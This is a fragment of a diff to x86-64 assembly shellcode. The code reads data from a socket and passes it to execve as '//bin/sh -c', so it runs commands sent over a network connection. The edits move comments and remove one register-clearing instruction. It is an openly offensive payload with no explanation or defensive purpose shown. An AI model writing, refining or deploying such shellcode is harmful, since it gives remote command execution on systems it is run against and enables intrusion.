@@ -59,8 +59,10 @@ _connect:
 ;		
 ;	jmp _connect			; jmp in parent sys_connect
 ;
-; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
+
+
 _readexec:
+; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
 	xor rax, rax
 	xor rdi, rdi
 	xor rsi, rsi
@@ -81,7 +83,6 @@ _readexec:
 	
 ; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[])-----
 	xor rax, rax
-	xor rdx, rdx
         xor rbx, rbx
         xor rcx, rcx
 	xor rsi, rsi	
@@ -116,7 +117,7 @@ _readexec:
 	push r14			; push -c
 	push rbx			; push //bin/sh
 
-	mov rsi, rsp			; get [ //bin/sh, -c, [sock_buffer] ]
+	mov rsi, rsp			; get [ //bin/sh, -c, fd_sock_buffer ]
 
         mov al, 59                      ; syscall 59 - execve
         syscall
